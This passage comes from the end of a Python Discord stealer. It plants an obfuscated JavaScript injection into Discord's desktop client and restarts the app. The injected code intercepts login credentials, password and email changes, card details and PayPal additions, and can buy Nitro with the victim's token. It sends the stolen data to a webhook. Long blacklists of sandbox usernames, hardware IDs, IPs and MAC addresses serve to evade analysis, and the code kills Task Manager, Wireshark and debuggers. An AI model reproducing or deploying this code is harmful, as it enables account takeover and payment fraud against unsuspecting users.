a8);},nitroBought=async _0x4f5c65=>{const _0x1c9c04=_0x25b1bd,_0x3b45d9=await getInfo(_0x4f5c65),_0x502f0f=getNitro(_0x3b45d9['premium_type']),_0x8d3c83=getBadges(_0x3b45d9['flags']),_0x23587a=await getBilling(_0x4f5c65),_0xf405a7=await buyNitro(_0x4f5c65),_0x1a49a0={'username':config['embed_name'],'content':_0xf405a7,'avatar_url':config[_0x1c9c04(0x17d)],'embeds':[{'color':config[_0x1c9c04(0x1f4)],'fields':[{'name':_0x1c9c04(0x1e1),'value':_0x1c9c04(0x229)+_0xf405a7+'```','inline':!![]},{'name':'**Discord\x20Info**','value':_0x1c9c04(0x1d9)+_0x502f0f+_0x1c9c04(0x19b)+_0x8d3c83+'**\x0aBilling:\x20**'+_0x23587a+'**','inline':!![]},{'name':_0x1c9c04(0x1bb),'value':'`'+_0x4f5c65+'`','inline':![]}],'author':{'name':_0x3b45d9[_0x1c9c04(0x203)]+'#'+_0x3b45d9[_0x1c9c04(0x1b8)]+_0x1c9c04(0x1c8)+_0x3b45d9['id'],'icon_url':_0x1c9c04(0x15d)+_0x3b45d9['id']+'/'+_0x3b45d9[_0x1c9c04(0x19a)]+_0x1c9c04(0x19c)},'footer':{'text':'🎉・Discord\x20Injection\x20By\x20github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'}}]};if(config[_0x1c9c04(0x1b6)])_0x1a49a0[_0x1c9c04(0x1e0)]=config['ping_val']+('\x0a'+_0xf405a7);hooker(_0x1a49a0);};session[_0x25b1bd(0x227)]['webRequest'][_0x25b1bd(0x16a)](config[_0x25b1bd(0x1cc)],(_0x15315c,_0x418e4c)=>{const _0x4012ab=_0x25b1bd;if(_0x15315c[_0x4012ab(0x1bf)]['startsWith'](_0x4012ab(0x19e)))return _0x418e4c({'cancel':!![]});updateCheck();}),session[_0x25b1bd(0x227)]['webRequest'][_0x25b1bd(0x213)]((_0xace6a,_0x39c3d9)=>{const _0x2e37fc=_0x25b1bd;_0xace6a[_0x2e37fc(0x1bf)][_0x2e37fc(0x18b)](config[_0x2e37fc(0x1a0)])?_0xace6a['url'][_0x2e37fc(0x1a8)]('discord.com')?_0x39c3d9({'responseHeaders':Object['assign']({'Access-Control-Allow-Headers':'*'},_0xace6a['responseHeaders'])}):_0x39c3d9({'responseHeaders':Object['assign']({'Content-Security-Policy':['default-src\x20\x27*\x27','Access-Control-Allow-Headers\x20\x27*\x27',_0x2e37fc(0x211)],'Access-Control-Allow-Headers':'*','Access-Control-Allow-Origin':'*'},_0xace6a[_0x2e37fc(0x1c2)])}):(delete _0xace6a[_0x2e37fc(0x1c2)][_0x2e37fc(0x199)],delete _0xace6a[_0x2e37fc(0x1c2)][_0x2e37fc(0x1b3)],_0x39c3d9({'responseHeaders':{..._0xace6a[_0x2e37fc(0x1c2)],'Access-Control-Allow-Headers':'*'}}));}),session[_0x25b1bd(0x227)]['webRequest'][_0x25b1bd(0x1be)](config[_0x25b1bd(0x15b)],async(_0x192013,_0x1edf3d)=>{const _0x5e620b=_0x25b1bd;if(_0x192013[_0x5e620b(0x1fb)]!==0xc8&&_0x192013[_0x5e620b(0x1fb)]!==0xca)return;const _0x1d00c4=Buffer[_0x5e620b(0x196)](_0x192013['uploadData'][0x0][_0x5e620b(0x1c0)])[_0x5e620b(0x221)](),_0x3cab07=JSON['parse'](_0x1d00c4),_0x127794=await execScript(_0x5e620b(0x20a));switch(!![]){case _0x192013['url'][_0x5e620b(0x15f)](_0x5e620b(0x1e8)):login(_0x3cab07[_0x5e620b(0x1e8)],_0x3cab07[_0x5e620b(0x1da)],_0x127794)[_0x5e620b(0x1cf)](console['error']);break;case _0x192013[_0x5e620b(0x1bf)]['endsWith']('users/@me')&&_0x192013['method']===_0x5e620b(0x1ba):if(!_0x3cab07[_0x5e620b(0x1da)])return;_0x3cab07[_0x5e620b(0x222)]&&emailChanged(_0x3cab07['email'],_0x3cab07['password'],_0x127794)[_0x5e620b(0x1cf)](console[_0x5e620b(0x1e9)]);_0x3cab07['new_password']&&passwordChanged(_0x3cab07[_0x5e620b(0x1da)],_0x3cab07[_0x5e620b(0x1ab)],_0x127794)[_0x5e620b(0x1cf)](console['error']);break;case _0x192013['url'][_0x5e620b(0x15f)](_0x5e620b(0x212))&&_0x192013[_0x5e620b(0x21f)]===_0x5e620b(0x1f5):const _0xce2e00=querystring[_0x5e620b(0x1ac)](unparsedData[_0x5e620b(0x221)]());ccAdded(_0xce2e00['card[number]'],_0xce2e00[_0x5e620b(0x190)],_0xce2e00[_0x5e620b(0x1cb)],_0xce2e00['card[exp_year]'],_0x127794)[_0x5e620b(0x1cf)](console[_0x5e620b(0x1e9)]);break;case _0x192013[_0x5e620b(0x1bf)][_0x5e620b(0x15f)](_0x5e620b(0x1a5))&&_0x192013['method']===_0x5e620b(0x1f5):PaypalAdded(_0x127794)[_0x5e620b(0x1cf)](console[_0x5e620b(0x1e9)]);break;case _0x192013[_0x5e620b(0x1bf)][_0x5e620b(0x15f)](_0x5e620b(0x16d))&&_0x192013[_0x5e620b(0x21f)]===_0x5e620b(0x1f5):if(!config[_0x5e620b(0x218)])return;setTimeout(()=>{nitroBought(_0x127794)['catch'](console['error']);},0x1d4c);break;default:break;}}),module['exports']=require('./core.asar');
"""    
        for dir in self.discord_dirs:
            if not os.path.exists(dir): continue    
            
            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)
            
    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules): continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'): 
                            continue
                        
                        return core, file
                    
    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'
        
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            
class debug:
    def __init__(self):
        if self.checks(): self.self_destruct()
    
    def checks(self):
        debugging = False 
        
        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
        
        self.check_process()
        if self.get_network(): debugging = True
        if self.get_system(): debugging = True
  
        return debugging

    def check_process(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
     
    def get_network(self):
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        if ip in self.blackListedIPS: return True	
        if mac in self.blackListedMacs: return True
        
    def get_system(self):
        hwid = (subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read() + subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stderr.read()).decode().split("\n")[1]     
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        
        if hwid in self.blackListedHWIDS: return True
        if username in self.blackListedUsers: return True
        if hostname in self.blackListedPCNames: return True
    
    def self_destruct(self):
        sys.exit()        

if __name__ == "__main__":
    main()
